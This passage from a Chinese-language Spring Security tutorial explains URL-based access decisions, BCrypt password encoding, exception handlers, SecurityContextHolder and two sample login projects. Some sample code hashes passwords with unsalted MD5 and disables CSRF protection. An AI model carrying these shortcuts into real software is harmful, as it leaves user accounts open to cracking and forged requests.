configAttribute.getAttribute();\n\t\t\t//判断角色是否为登陆即可访问的角色，此角色在CustomFilter中设置\n\t\t\tif(\"ROLE_LOGIN\".equals(needRole)){\n\t\t\t\t//判断是否登陆\n\t\t\t\tif(authentication instanceof AnonymousAuthenticationToken){\n\t\t\t\t\tthrow new AccessDeniedException(\"尚未登陆，请登陆\");\n\t\t\t\t}else{\n\t\t\t\t\treturn;\n\t\t\t\t}\n\t\t\t}\n\t\t\t//判断用户角色是否为url所需角色\n\t\t\tCollection<? extends GrantedAuthority> authorities = authentication.getAuthorities();\n\t\t\tfor(GrantedAuthority grantedAuthority : authorities){\n\t\t\t\tif(grantedAuthority.getAuthority().equals(needRole)){\n\t\t\t\t\treturn;\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\t\tthrow new AccessDeniedException(\"权限不足，请联系管理员\");\n\t}\n\t@Override\n\tpublic boolean supports(ConfigAttribute configAttribute) {return false;}\n\t@Override\n\tpublic boolean supports(Class<?> aClass) {return false;}\n}\n```\n绑定\n```java\nhttp.csrf()\n\t\t.and()\n\t\t//动态权限配置\n\t\t.withObjectPostProcessor(new ObjectPostProcessor<FilterSecurityInterceptor>() {\n\t\t\t@Override\n\t\t\tpublic <O extends FilterSecurityInterceptor> O postProcess(O o) {\n\t\t\t\to.setAccessDecisionManager(customUrlDecisionManager); //绑定\n\t\t\t\treturn o;\n\t\t\t}\n\t\t})\n```\n\n\n## PasswordEncoder接口与BCryptPasswordEncoder类\n**PasswordEncoder接口**\nPasswordEncoder接口中的方法如下：\n```java\n// 表示把参数按照特定的解析规则进行解析\nString encode(CharSequence rawPassword);\n\n// 表示验证从存储中获取的编码密码与编码后提交的原始密码是否匹配。如果密码匹配，则返回 true；如果不匹配，则返回 false。第一个参数表示需要被解析的密码。第二个参数表示存储的密码。\nboolean matches(CharSequence rawPassword, String encodedPassword);\n\n// 表示如果解析的密码能够再次进行解析且达到更安全的结果则返回 true，否则返回false。默认返回 false。\ndefault boolean upgradeEncoding(String encodedPassword) {return false; }\n```\n\n**BCryptPasswordEncoder类**\nBCryptPasswordEncoder是PasswordEncoder接口的一个实现类，它是Spring Security官方推荐的密码解析器，平时多使用这个解析器\nBCryptPasswordEncoder是对bcrypt强散列方法的具体实现。是基于Hash算法实现的单向加密。可以通过strength控制加密强度，默认为10\n示例：\n```java\n@Test\npublic void test01(){\n  // 创建密码解析器\n  BCryptPasswordEncoder bCryptPasswordEncoder = new BCryptPasswordEncoder();\n  // 对密码进行加密\n  String atguigu = bCryptPasswordEncoder.encode(\"atguigu\");\n  // 打印加密之后的数据\n  System.out.println(\"加密之后数据：\\t\"+atguigu);\n  //判断原字符加密后和加密之前是否匹配\n  boolean result = bCryptPasswordEncoder.matches(\"atguigu\", atguigu);\n  // 打印比较结果\n  System.out.println(\"比较结果：\\t\"+result); //输出：true\n}\n```\nspringsecurity要求**一定要**有密码解析器，当用户登陆时，输入的密码会**自动**被你设置密码解析器进行加密，然后再放入数据库中\n\n\n## SpringSecurity 的HttpSecurity，WebSecurity与AuthenticationManagerBuilder区别与应用\n**configure（AuthenticationManagerBuilder）**\n用于通过允许轻松添加AuthenticationProviders来建立身份验证机制：例如，以下内容定义了具有内置“用户”和“管理员”登录名的内存中身份验证。\n```java\npublic void configure(AuthenticationManagerBuilder auth) {\n    auth\n        .inMemoryAuthentication()\n        .withUser(\"user\")\n        .password(\"password\")\n        .roles(\"USER\")\n    .and()\n        .withUser(\"admin\")\n        .password(\"password\")\n        .roles(\"ADMIN\",\"USER\");\n}\n```\n\n**configure（HttpSecurity）**\n允许基于选择匹配在资源级别配置基于Web的安全性-例如，以下示例将以/ admin /开头的URL限制为具有ADMIN角色的用户，并声明需要使用其他任何URL成功认证。\n```java\nprotected void configure(HttpSecurity http) throws Exception {\n    http\n        .authorizeRequests()\n        .antMatchers(\"/admin/**\").hasRole(\"ADMIN\")\n        .anyRequest().authenticated()\n}\n```\n\n**configure（WebSecurity）**\n用于影响全局安全性的配置设置（忽略资源，设置调试模式，通过实现自定义防火墙定义拒绝请求）。例如，以下方法会使得以/resources/开头的任何请求都不需要认证\n```java\npublic void configure(WebSecurity web) throws Exception {\n    web\n       .ignoring()\n       .antMatchers(\"/resources/**\");\n}\n```\n\n## Spring Security 中的异常处理\nHttp 协议对认证授权的响应结果也有规定。\n**401 未授权状态**\nHTTP 401 错误 - 未授权(Unauthorized) 一般来说该错误消息表明您首先需要登录（输入有效的用户名和密码）。 如果你刚刚输入这些信息，立刻就看到一个 401 错误，就意味着，无论出于何种原因您的用户名和密码其中之一或两者都无效（输入有误，用户名暂时停用，账户被锁定，凭证失效等） 。总之就是认证失败了。对应`AuthenticationException`。\n\n**403 被拒绝状态**\nHTTP 403 错误 - 被禁止(Forbidden) 出现该错误表明您在访问受限资源时没有得到许可。服务器理解了本次请求但是拒绝执行该任务，该请求不该重发给服务器。并且服务器想让客户端知道为什么没有权限访问特定的资源，服务器应该在返回的信息中描述拒绝的理由。一般实践中我们会比较模糊的表明原因。 该错误对应的`AccessDeniedException`。\n\n`AuthenticationEntryPoint`该类用来统一处理AuthenticationException异常\n`AccessDeniedHandler`该类用来统一处理`AccessDeniedException`异常\n我们只要实现并配置这两个异常处理类即可实现对 Spring Security 认证授权相关的异常进行统一的自定义处理。\n\n**实现 AuthenticationEntryPoint**\n以 json 信息响应。\n```java\n public class SimpleAuthenticationEntryPoint implements AuthenticationEntryPoint {\n     @Override\n     public void commence(HttpServletRequest request, HttpServletResponse response, AuthenticationException authException) throws IOException, ServletException {\n\n         //todo your business\n         HashMap<String, String> map = new HashMap<>(2);\n         map.put(\"uri\", request.getRequestURI());\n         map.put(\"msg\", \"认证失败\");\n         response.setStatus(HttpServletResponse.SC_UNAUTHORIZED);\n         response.setCharacterEncoding(\"utf-8\");\n         response.setContentType(MediaType.APPLICATION_JSON_VALUE);\n         ObjectMapper objectMapper = new ObjectMapper();\n         String resBody = objectMapper.writeValueAsString(map);\n         PrintWriter printWriter = response.getWriter();\n         printWriter.print(resBody);\n         printWriter.flush();\n         printWriter.close();\n     }\n }\n```\n**实现 AccessDeniedHandler**\n同样以 json 信息响应。\n```java\n public class SimpleAccessDeniedHandler implements AccessDeniedHandler {\n     @Override\n     public void handle(HttpServletRequest request, HttpServletResponse response, AccessDeniedException accessDeniedException) throws IOException, ServletException {\n         //todo your business\n         HashMap<String, String> map = new HashMap<>(2);\n         map.put(\"uri\", request.getRequestURI());\n         map.put(\"msg\", \"认证失败\");\n         response.setStatus(HttpServletResponse.SC_FORBIDDEN);\n         response.setCharacterEncoding(\"utf-8\");\n         response.setContentType(MediaType.APPLICATION_JSON_VALUE);\n         ObjectMapper objectMapper = new ObjectMapper();\n         String resBody = objectMapper.writeValueAsString(map);\n         PrintWriter printWriter = response.getWriter();\n         printWriter.print(resBody);\n         printWriter.flush();\n         printWriter.close();\n     }\n }\n```\n**配置**\n实现了上述两个接口后，我们只需要在 WebSecurityConfigurerAdapter 的 configure(HttpSecurity http) 方法中配置即可。相关的配置片段如下：\n```java\n http.exceptionHandling()\n        .accessDeniedHandler(new SimpleAccessDeniedHandler())\n        .authenticationEntryPoint(new SimpleAuthenticationEntryPoint())\n```\n\n## 安全上下文SecurityContext与其工具类SecurityContextHolder\n当服务端对用户认证通过后，会将认证用户的信息封装到 UsernamePasswordAuthenticationToken 中 并使用工具类放入安全上下文 SecurityContext 中，当服务端响应用户后又使用同一个工具类将 UsernamePasswordAuthenticationToken 从 SecurityContext 中 clear 掉。\n我们来简单了解 SecurityContext 具体是个什么东西。\n```java\n package org.springframework.security.core.context;\n \n import java.io.Serializable;\n import org.springframework.security.core.Authentication;\n \n public interface SecurityContext extends Serializable {\n     Authentication getAuthentication();\n \n     void setAuthentication(Authentication var1);\n }\n```\n从源码上来看很简单就是一个存储 Authentication 的容器。而 Authentication 是一个用户凭证接口用来作为用户认证的凭证使用，通常常用的实现有 认证用户 UsernamePasswordAuthenticationToken 和 匿名用户AnonymousAuthenticationToken。其中 UsernamePasswordAuthenticationToken 包含了 UserDetails , AnonymousAuthenticationToken 只包含了一个字符串 anonymousUser 作为匿名用户的标识。我们通过 SecurityContext 获取上下文时需要来进行类型判断。接下来我们来聊聊操作 SecurityContext 的工具类SecurityContextHolder。\n\n### SecurityContextHolder\nSecurityContextHolder提供的方法：\n```\nclearContext  清除当前的 SecurityContext\ngetContext  获取当前的 SecurityContext\nsetContext  设置当前的 SecurityContext\n```\n平常我们通过这三个方法来操作安全上下文 SecurityContext 。你可以直接在代码中使用工具类 SecurityContextHolder 获取用户信息，像下面一样：\n```java\n public String getCurrentUser() {\n    Authentication authentication = SecurityContextHolder.getContext().getAuthentication();\n          \n     if (authentication instanceof AnonymousAuthenticationToken){\n         return \"anonymousUser\";\n     }\n    UserDetails principal = (UserDetails) authentication.getPrincipal();\n    return principal.getUsername();\n }     \n```\n**SecurityContextHolder的存储策略**\nSecurityContextHolder 默认有三种存储 SecurityContext 的策略：\n- MODE_THREADLOCAL   利用ThreadLocal 机制来保存每个使用者的 SecurityContext，缺省策略，平常我们使用这个就行了。\n- MODE_INHERITABLETHREADLOCAL  利用InheritableThreadLocal 机制来保存每个使用者的 SecurityContext，多用于多线程环境环境下。\n- MODE_GLOBAL  静态机制，作用于全局。不太常用。\n\n**总结**\nSecurityContext 是 Spring Security 中的一个非常重要类，今天不但介绍 SecurityContext 是什么、有什么作用，也对以前讲过的一些知识进行回顾。\n也对如何使用 SecurityContextHolder 操作 SecurityContext 进行了讲解。最后也简单讲述了 SecurityContextHolder 三种存储 SecurityContext 的策略和使用场景 。希望对你学习 Spring Security 有帮助。还请多多关注。\n## SpringSecurity实战1\n从网上找了一张Spring Security 的工作流程图，如下。\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220408161408.png)\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220408161418.png)\n\n**建表**\n\n表结构\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220408161436.png)\n\n**User**\n```java\npublic class User implements UserDetails , Serializable {\n\n    private Long id;\n    private String username;\n    private String password;\n\n    private List<Role> authorities;\n\n    public Long getId() {\n        return id;\n    }\n\n    public void setId(Long id) {\n        this.id = id;\n    }\n\n    @Override\n    public String getUsername() {\n        return username;\n    }\n\n    public void setUsername(String username) {\n        this.username = username;\n    }\n\n    @Override\n    public String getPassword() {\n        return password;\n    }\n\n    public void setPassword(String password) {\n        this.password = password;\n    }\n\n    @Override\n    public List<Role> getAuthorities() {\n        return authorities;\n    }\n\n    public void setAuthorities(List<Role> authorities) {\n        this.authorities = authorities;\n    }\n\n    /**\n     * 用户账号是否过期\n     */\n    @Override\n    public boolean isAccountNonExpired() {\n        return true;\n    }\n\n    /**\n     * 用户账号是否被锁定\n     */\n    @Override\n    public boolean isAccountNonLocked() {\n        return true;\n    }\n\n    /**\n     * 用户密码是否过期\n     */\n    @Override\n    public boolean isCredentialsNonExpired() {\n        return true;\n    }\n\n    /**\n     * 用户是否可用\n     */\n    @Override\n    public boolean isEnabled() {\n        return true;\n    }\n    \n}\n```\n上面的 User 类实现了 UserDetails 接口，该接口是实现Spring Security 认证信息的核心接口。其中 getUsername 方法为 UserDetails 接口 的方法，这个方法返回 username，也可以是其他的用户信息，例如手机号、邮箱等。getAuthorities() 方法返回的是该用户设置的权限信息，在本实例中，从数据库取出用户的所有角色信息，权限信息也可以是用户的其他信息，不一定是角色信息。另外需要读取密码，最后几个方法一般情况下都返回 true，也可以根据自己的需求进行业务判断。\n\n**Role**\n```java\npublic class Role implements GrantedAuthority {\n\n    private Long id;\n    private String name;\n\n    public Long getId() {\n        return id;\n    }\n\n    public void setId(Long id) {\n        this.id = id;\n    }\n\n    public String getName() {\n        return name;\n    }\n\n    public void setName(String name) {\n        this.name = name;\n    }\n\n    @Override\n    public String getAuthority() {\n        return name;\n    }\n\n}\n```\nRole 类实现了 GrantedAuthority 接口，并重写 getAuthority() 方法。权限点可以为任何字符串，不一定非要用角色名。\n\n所有的Authentication实现类都保存了一个GrantedAuthority列表，其表示用户所具有的权限。GrantedAuthority是通过AuthenticationManager设置到Authentication对象中的，然后AccessDecisionManager将从Authentication中获取用户所具有的GrantedAuthority来鉴定用户是否具有访问对应资源的权限。\n\n**MyUserDetailsService**\n```java\n@Service\npublic class MyUserDetailsService implements UserDetailsService {\n\n    @Autowired\n    private UserMapper userMapper;\n    @Autowired\n    private RoleMapper roleMapper;\n\n    @Override\n    public UserDetails loadUserByUsername(String userName) throws UsernameNotFoundException {\n        //查数据库\n        User user = userMapper.loadUserByUsername( userName );\n        if (null != user) {\n            List<Role> roles = roleMapper.getRolesByUserId( user.getId() );\n            user.setAuthorities( roles );\n        }\n        return user;\n    }\n    \n\n}\n```\nService 层需要实现 UserDetailsService 接口，该接口是根据用户名获取该用户的所有信息， 包括用户信息和权限点。\n\n**MyInvocationSecurityMetadataSourceService**\n```java\n@Component\npublic class MyInvocationSecurityMetadataSourceService implements FilterInvocationSecurityMetadataSource {\n\n    @Autowired\n    private PermissionMapper permissionMapper;\n\n    /**\n     * 每一个资源所需要的角色 Collection<ConfigAttribute>决策器会用到\n     */\n    private static HashMap<String, Collection<ConfigAttribute>> map =null;\n\n\n    /**\n     * 返回请求的资源需要的角色\n     */\n    @Override\n    public Collection<ConfigAttribute> getAttributes(Object o) throws IllegalArgumentException {\n        if (null == map) {\n            loadResourceDefine();\n        }\n        //object 中包含用户请求的request 信息\n        HttpServletRequest request = ((FilterInvocation) o).getHttpRequest();\n        for (Iterator<String> it = map.keySet().iterator() ; it.hasNext();) {\n            String url = it.next();\n            if (new AntPathRequestMatcher( url ).matches( request )) {\n                return map.get( url );\n            }\n        }\n        return null;\n    }\n\n    @Override\n    public Collection<ConfigAttribute> getAllConfigAttributes() {\n        return null;\n    }\n\n    @Override\n    public boolean supports(Class<?> aClass) {\n        return true;\n    }\n\n    /**\n     * 初始化 所有资源 对应的角色\n     */\n    public void loadResourceDefine() {\n        map = new HashMap<>(16);\n        //权限资源 和 角色对应的表  也就是 角色权限 中间表\n        List<RolePermisson> rolePermissons = permissionMapper.getRolePermissions();\n\n        //某个资源 可以被哪些角色访问\n        for (RolePermisson rolePermisson : rolePermissons) {\n            String url = rolePermisson.getUrl();\n            String roleName = rolePermisson.getRoleName();\n            ConfigAttribute role = new SecurityConfig(roleName);\n\n            if(map.containsKey(url)){\n                map.get(url).add(role);\n            }else{\n                List<ConfigAttribute> list =  new ArrayList<>();\n                list.add( role );\n                map.put( url , list );\n            }\n        }\n    }\n\n\n}\n```\nMyInvocationSecurityMetadataSourceService 类实现了 FilterInvocationSecurityMetadataSource，FilterInvocationSecurityMetadataSource 的作用是用来储存请求与权限的对应关系。\n\nFilterInvocationSecurityMetadataSource接口有3个方法：\n\n- `boolean supports(Class<?> clazz)`：指示该类是否能够为指定的方法调用或Web请求提供ConfigAttributes。\n- `Collection<ConfigAttribute> getAllConfigAttributes()`：Spring容器启动时自动调用, 一般把所有请求与权限的对应关系也要在这个方法里初始化, 保存在一个属性变量里。\n- `Collection<ConfigAttribute> getAttributes(Object object)`：当接收到一个http请求时, filterSecurityInterceptor会调用的方法. 参数object是一个包含url信息的HttpServletRequest实例. 这个方法要返回请求该url所需要的所有权限集合。\n\n**MyAccessDecisionManager**\n```java\n/**\n * 决策器\n */\n@Component\npublic class MyAccessDecisionManager implements AccessDecisionManager {\n\n    private final static Logger logger = LoggerFactory.getLogger(MyAccessDecisionManager.class);\n\n    /**\n     * 通过传递的参数来决定用户是否有访问对应受保护对象的权限\n     *\n     * @param authentication 包含了当前的用户信息，包括拥有的权限。这里的权限来源就是前面登录时UserDetailsService中设置的authorities。\n     * @param object  就是FilterInvocation对象，可以得到request等web资源\n     * @param configAttributes configAttributes是本次访问需要的权限\n     */\n    @Override\n    public void decide(Authentication authentication, Object object, Collection<ConfigAttribute> configAttributes) throws AccessDeniedException, InsufficientAuthenticationException {\n        if (null == configAttributes || 0 >= configAttributes.size()) {\n            return;\n        } else {\n            String needRole;\n            for(Iterator<ConfigAttribute> iter = configAttributes.iterator(); iter.hasNext(); ) {\n                needRole = iter.next().getAttribute();\n\n                for(GrantedAuthority ga : authentication.getAuthorities()) {\n                    if(needRole.trim().equals(ga.getAuthority().trim())) {\n                        return;\n                    }\n                }\n            }\n            throw new AccessDeniedException(\"当前访问没有权限\");\n        }\n\n    }\n\n    /**\n     * 表示此AccessDecisionManager是否能够处理传递的ConfigAttribute呈现的授权请求\n     */\n    @Override\n    public boolean supports(ConfigAttribute configAttribute) {\n        return true;\n    }\n\n    /**\n     * 表示当前AccessDecisionManager实现是否能够为指定的安全对象（方法调用或Web请求）提供访问控制决策\n     */\n    @Override\n    public boolean supports(Class<?> aClass) {\n        return true;\n    }\n\n}\n```\nMyAccessDecisionManager 类实现了AccessDecisionManager接口，AccessDecisionManager是由AbstractSecurityInterceptor调用的，它负责鉴定用户是否有访问对应资源（方法或URL）的权限。\n\n**MyFilterSecurityInterceptor**\n```java\n@Component\npublic class MyFilterSecurityInterceptor extends AbstractSecurityInterceptor implements Filter {\n\n\n    @Autowired\n    private FilterInvocationSecurityMetadataSource securityMetadataSource;\n\n    @Autowired\n    public void setMyAccessDecisionManager(MyAccessDecisionManager myAccessDecisionManager) {\n        super.setAccessDecisionManager(myAccessDecisionManager);\n    }\n\n\n    @Override\n    public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {\n\n        FilterInvocation fi = new FilterInvocation(servletRequest, servletResponse, filterChain);\n        invoke(fi);\n    }\n\n    public void invoke(FilterInvocation fi) throws IOException, ServletException {\n\n        InterceptorStatusToken token = super.beforeInvocation(fi);\n        try {\n            //执行下一个拦截器\n            fi.getChain().doFilter(fi.getRequest(), fi.getResponse());\n        } finally {\n            super.afterInvocation(token, null);\n        }\n    }\n\n    @Override\n    public Class<?> getSecureObjectClass() {\n        return FilterInvocation.class;\n    }\n\n    @Override\n    public SecurityMetadataSource obtainSecurityMetadataSource() {\n\n        return this.securityMetadataSource;\n    }\n    \n    \n}\n```\n每种受支持的安全对象类型（方法调用或Web请求）都有自己的拦截器类，它是AbstractSecurityInterceptor的子类，AbstractSecurityInterceptor 是一个实现了对受保护对象的访问进行拦截的抽象类。\n\nAbstractSecurityInterceptor的机制可以分为几个步骤：\n1. 查找与当前请求关联的“配置属性（简单的理解就是权限）”\n2. 将 安全对象（方法调用或Web请求）、当前身份验证、配置属性 提交给决策器（AccessDecisionManager）\n3. （可选）更改调用所根据的身份验证\n4. 允许继续进行安全对象调用(假设授予了访问权)\n5. 在调用返回之后，如果配置了AfterInvocationManager。如果调用引发异常，则不会调用AfterInvocationManager。\n\n\nAbstractSecurityInterceptor中的方法说明：\n- beforeInvocation()方法实现了对访问受保护对象的权限校验，内部用到了AccessDecisionManager和AuthenticationManager；\n- finallyInvocation()方法用于实现受保护对象请求完毕后的一些清理工作，主要是如果在beforeInvocation()中改变了SecurityContext，则在finallyInvocation()中需要将其恢复为原来的SecurityContext，该方法的调用应当包含在子类请求受保护资源时的finally语句块中。\n- afterInvocation()方法实现了对返回结果的处理，在注入了AfterInvocationManager的情况下默认会调用其decide()方法。\n\n了解了AbstractSecurityInterceptor，就应该明白了，我们自定义MyFilterSecurityInterceptor就是想使用我们之前自定义的 AccessDecisionManager 和 securityMetadataSource。\n\n**SecurityConfig**\n@EnableWebSecurity注解以及WebSecurityConfigurerAdapter一起配合提供基于web的security。自定义类 继承了WebSecurityConfigurerAdapter来重写了一些方法来指定一些特定的Web安全设置。\n```java\n@Configuration\n@EnableWebSecurity\npublic class SecurityConfig extends WebSecurityConfigurerAdapter {\n\n    @Autowired\n    private MyUserDetailsService userService;\n\n\n    @Autowired\n    public void configureGlobal(AuthenticationManagerBuilder auth) throws Exception {\n\n        //校验用户\n        auth.userDetailsService( userService ).passwordEncoder( new PasswordEncoder() {\n            //对密码进行加密\n            @Override\n            public String encode(CharSequence charSequence) {\n                System.out.println(charSequence.toString());\n                return DigestUtils.md5DigestAsHex(charSequence.toString().getBytes());\n            }\n            //对密码进行判断匹配\n            @Override\n            public boolean matches(CharSequence charSequence, String s) {\n                String encode = DigestUtils.md5DigestAsHex(charSequence.toString().getBytes());\n                boolean res = s.equals( encode );\n                return res;\n            }\n        } );\n\n    }\n\n    @Override\n    protected void configure(HttpSecurity http) throws Exception {\n        http.authorizeRequests()\n                .antMatchers(\"/\",\"index\",\"/login\",\"/login-error\",\"/401\",\"/css/**\",\"/js/**\").permitAll()\n                .anyRequest().authenticated()\n                .and()\n                .formLogin().loginPage( \"/login\" ).failureUrl( \"/login-error\" )\n                .and()\n                .exceptionHandling().accessDeniedPage( \"/401\" );\n        http.logout().logoutSuccessUrl( \"/\" );\n    }\n\n}\n```\n\n**MainController**\n```java\n@Controller\npublic class MainController {\n\n    @RequestMapping(\"/\")\n    public String root() {\n        return \"redirect:/index\";\n    }\n\n    @RequestMapping(\"/index\")\n    public String index() {\n        return \"index\";\n    }\n\n    @RequestMapping(\"/login\")\n    public String login() {\n        return \"login\";\n    }\n\n    @RequestMapping(\"/login-error\")\n    public String loginError(Model model) {\n        model.addAttribute( \"loginError\"  , true);\n        return \"login\";\n    }\n\n    @GetMapping(\"/401\")\n    public String accessDenied() {\n        return \"401\";\n    }\n\n    @GetMapping(\"/user/common\")\n    public String common() {\n        return \"user/common\";\n    }\n\n    @GetMapping(\"/user/admin\")\n    public String admin() {\n        return \"user/admin\";\n    }\n\n\n}\n```\n\n## SpringSecurity实战2\n项目目录：\n- java\n  - com.example.springsecurity\n    - config\n      - <a href=\"#SecurityConfig\">SecurityConfig.java</a>\n    - controller\n      - <a href=\"#LoginController\">LoginController.java</a>\n    - handler\n      - <a href=\"#MyAccessDeniedHandler\">MyAccessDeniedHandler.java</a>\n      - <a href=\"#MyAuthenticationFailureHandler\">MyAuthenticationFailureHandler.java</a>\n      - <a href=\"#MyAuthenticationSuccessHandler\">MyAuthenticationSuccessHandler.java</a>\n    - service\n      - <a href=\"#MyService\">MyService.java</a>\n      - <a href=\"#UserDetailsServiceImpl\">UserDetailsServiceImpl.java</a>\n    - <a href=\"#SpringsecurityApplication\">SpringsecurityApplication.java</a>\n- resources\n  - <a href=\"#applicationProperties\">application.properties</a>\n  - static\n    - <a href=\"#login\">login.html</a>\n    - <a href=\"#main\">main.html</a>\n\n**依赖**\n```xml\n<dependency>\n  <groupId>org.springframework.boot</groupId>\n  <artifactId>spring-boot-starter-security</artifactId>\n</dependency>\n```\n**<span id=\"SecurityConfig\">springSecurity配置类</span>**\n```java\n@Configuration\npublic class SecurityConfig extends WebSecurityConfigurerAdapter {\n\n\t@Autowired\n\tprivate MyAccessDeniedHandler myAccessDeniedHandler;\n\n\t@Autowired\n\tprivate UserDetailsServiceImpl userDetailsService;\n\n\t@Autowired\n\tprivate DataSource dataSource;\n\n\t@Autowired\n\tprivate PersistentTokenRepository persistentTokenRepository;\n\n\t@Override\n\tprotected void configure(AuthenticationManagerBuilder auth) throws Exception{\n\t\t     //指定认证逻辑使用我们自定义的userDetailsService\n\t\tauth.userDetailsService(userDetailsService)\n\t\t\t\t//指定密码解析器\n\t\t\t\t.passwordEncoder(getPw());\n\t}\n\n\t@Override\n\tprotected void configure(HttpSecurity http) throws Exception {\n\t\t//有关表单提交的设置\n\t\thttp.formLogin()\n\n\t\t\t\t//设置form表单中的username对应的name\n\t\t\t\t.usernameParameter(\"username123\")\n\t\t\t\t//设置form表单中的password对应的name\n\t\t\t\t.passwordParameter(\"password123\")\n\n\t\t\t\t//当遇到'/login'请求时，去执行我们自定义认证逻辑UserDetailsServiceImpl中的loadUserByUsername方法,来进行用户认证。注：此处'/login'是form表单的action地址\n\t\t\t\t.loginProcessingUrl(\"/login\")\n\n\t\t\t\t//自定义登陆页面\n\t\t\t\t.loginPage(\"/login.html\")\n\n\t\t\t\t/**\n\t\t\t\t * successHandler方法与successForwardUrl方法不能同时使用，有关它们的区别见后面\n\t\t\t\t * successHandler()来指定认证成功后需要做的事情, 会调用MyAuthenticationSuccessHandler实例中的onAuthenticationSuccess方法\n\t\t\t\t * successForwardUrl方法用来指定认证成功后要发送的页面请求，是请求转发且为POST请求。所以要写一个注解为@PostMapping(\"/toMain\")的controller方法\n\t\t\t\t */\n\t\t\t\t.successHandler(new MyAuthenticationSuccessHandler(\"http://www.baidu.com\"))\n\t\t\t\t//.successForwardUrl(\"/toMain\")\n\n\t\t\t\t/**\n\t\t\t\t * failureHandler方法与failureForwardUrl方法不能同时使用，它们的区别跟successHandle方法与successForwardUrl方法的区别一样\n\t\t\t\t * failureHandler()来指定认功失败后需要做的事情, 会调用MyAuthenticationFailreHandler实例中的onAuthenticationFailure方法\n\t\t\t\t * failureForwardUrl方法用来指定认证失败后要发送的页面请求，是请求转发且为POST请求。所以要写一个注解为@PostMapping(\"/toError\")的controller方法\n\t\t\t\t */\n\t\t\t\t.failureHandler(new MyAuthenticationFailureHandler(\"http://www.bing.com\"));\n\t\t\t\t//.failureForwardUrl(\"/toErro\");\n\n\n\t\t//有关请求认证的设置\n\t\thttp.authorizeRequests()\n\t\t\t\t//设置/error.html的请求不需要认证\n\t\t\t\t.antMatchers(\"/error.html\").permitAll()\n\t\t\t\t//设置/login.html的请求不需要认证\n\t\t\t\t.antMatchers(\"/login.html\").permitAll()\n\t\t\t\t//设置js文件夹、css文件夹、images文件夹下的内容不需要认证\n\t\t\t\t.antMatchers(\"/js/**\", \"/css/**\", \"/images/**\").permitAll()\n\t\t\t\t//设置只要是png后缀的文件都不需要认证\n\t\t\t\t.antMatchers(\"/**/*.png\").permitAll()\n\t\t\t\t//请求为/demo且为get请求的请求不需要认证\n\t\t\t\t.antMatchers(HttpMethod.GET, \"/demo\").permitAll()\n\t\t\t\t//只有有admin权限的用户才能访问/main1.html\n\t\t\t\t.antMatchers(\"/main1.html\").hasAuthority(\"admin\")\n\t\t\t\t//有admin或adminN权限的用户才能访问/main2.html\n\t\t\t\t.antMatchers(\"/main2.html\").hasAnyAuthority(\"admin\", \"adminN\")\n\t\t\t\t//只有属于abc角色的用户才能访问/main3.html\n\t\t\t\t.antMatchers(\"/main3.html\").hasRole(\"abc\")\n\t\t\t\t//属于abc角色或Abc角色的用户才能访问/main4.html\n\t\t\t\t.antMatchers(\"/main4.html\").hasAnyRole(\"abc\", \"Abc\")\n\t\t\t\t//只允许ip地址为127.0.0.1的设备才能访问/main5.html\n\t\t\t\t.antMatchers(\"/main5.html\").hasIpAddress(\"127.0.0.1\")\n\t\t\t\t//permitAll()对应的access实现方法\n\t\t\t\t.antMatchers(\"/main6.html\").access(\"permitAll()\")\n\t\t\t\t//hasRole()对应的access实现方法\n\t\t\t\t.antMatchers(\"/main7.html\").access(\"hasRole('abc')\")\n\t\t\t\t//设置/main8.html的请求对应的权限控制为自定义的方法，它会调用MyService实例中的hasPermission方法，如果返回true，则认证成功，反之，认证失败。\n\t\t\t\t//在access中通过@bean的id名.方法的形式调用配置类中的方法\n\t\t\t\t.antMatchers(\"/main8.html\").access(\"@myService.hasPermission(request, authentication)\")\n\t\t\t\t//所有请求都必须要认证，必须要登陆之后才被访问，即所有请求都会先跳转到登陆页面认证后才被访问\n\t\t\t\t.anyRequest().authenticated();\n\n\t\t//异常处理\n\t\thttp.exceptionHandling()\n\t\t\t\t//当用户出现权限不足时，会调用MyAccessDeniedHandler实例中的handle方法\n\t\t\t\t.accessDeniedHandler(myAccessDeniedHandler);\n\n\t\t//记住我功能\n\t\thttp.rememberMe()\n\t\t\t\t//设置Token失效时间，默认为2周\n\t\t\t\t.tokenValiditySeconds(60)\n\t\t\t\t//设置所能识别的记住我的复选框的name\n\t\t\t\t.rememberMeParameter(\"remember-me\")\n\t\t\t\t//使用自定义认证逻辑处理\n\t\t\t\t.userDetailsService(userDetailsService)\n\t\t\t\t//springsecurity会自动将传入的有关Token对象放入数据库中\n\t\t\t\t.tokenRepository(persistentTokenRepository);\n\n\t\t//退出登陆,\n\t\thttp.logout()\n\t\t\t\t//设置退出登陆的url请求。springSecurity默认会将'/logout'请求url看出退出登陆请求，返回会对其请求做相应的操作。\n\t\t\t\t.logoutUrl(\"/Mylogout\")\n\t\t\t\t//退出登陆时跳转的页面\n\t\t\t\t.logoutSuccessUrl(\"/login.html\");\n\n\n\t\t//关闭csrf防护\n\t\thttp.csrf().disable();\n\t}\n\n\t@Bean\n\tpublic PasswordEncoder getPw(){\n\t\treturn new BCryptPasswordEncoder();\n\t}\n\n\n\t@Bean\n\tpublic PersistentTokenRepository getPersistentTokenRepository(){\n\t\tJdbcTokenRepositoryImpl jdbcTokenRepository = new JdbcTokenRepositoryImpl();\n\t\tjdbcTokenRepository.setDataSource(dataSource); //指定数据库源\n\t\t//自动建用于存放Token的表，注意：只有当数据库中没有这个表时才能使用这个话，否则会报错\n\t\tjdbcTokenRepository.setCreateTableOnStartup(true);\n\t\treturn jdbcTokenRepository;\n\t}\n}\n```\n\n**<span id=\"LoginController\">LoginController.java</span>**\n```java\n@Controller\npublic class LoginController {\n\n\t@RequestMapping(\"/login\")\n\tpublic String login(){\n\t\tSystem.out.println(\"执行登陆操作\");\n\t\treturn \"redirect:main.html\";\n\t}\n\n\t@Secured(\"ROLE_admin\") //基于注解的认证控制, 等价于.antMatchers(\"/main9.html\").hasRole(\"abc\")\n\t@RequestMapping(\"/main9\")\n\tpublic String main9(){\n\t\tSystem.out.println(\"执行登陆操作\");\n\t\treturn \"redirect:main9.html\";\n\t}\n\n\t//基于注解的认证控制, 等价于 .antMatchers(\"/main10.html\").access(\"hasRole('abc')\")\n\t// 